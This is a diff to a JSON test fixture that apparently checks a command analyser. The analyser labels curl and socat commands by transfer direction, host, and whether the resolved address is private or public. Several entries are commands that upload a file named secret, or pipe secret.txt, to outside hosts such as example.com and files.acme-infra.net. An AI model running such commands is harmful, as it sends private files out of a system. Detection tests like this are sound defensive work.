@@ -5095,6 +5095,58 @@
   {
    "command": "socat - TCP:files.acme-infra.net:443,proxyport=3128 < secret.txt",
    "transfer": null
+  },
+  {
+   "command": "curl --proto-default https --resolve example.com:443:10.20.30.40 -T secret example.com/up",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "10.20.30.40",
+      "address": "private"
+     }
+    ]
+   }
+  },
+  {
+   "command": "curl --resolve example.com:443:10.20.30.40 -T secret example.com/up",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "curl --proto-default=https --resolve example.com:443:10.20.30.40 https://example.com/up http://example.com/x",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "example.com",
+      "resolved_host": "10.20.30.40",
+      "address": "private"
+     },
+     {
+      "direction": "in",
+      "host": "example.com",
+      "resolved_host": "example.com",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "curl --proto-default ssh example.com/up",
+   "transfer": null
   }
  ]
 }
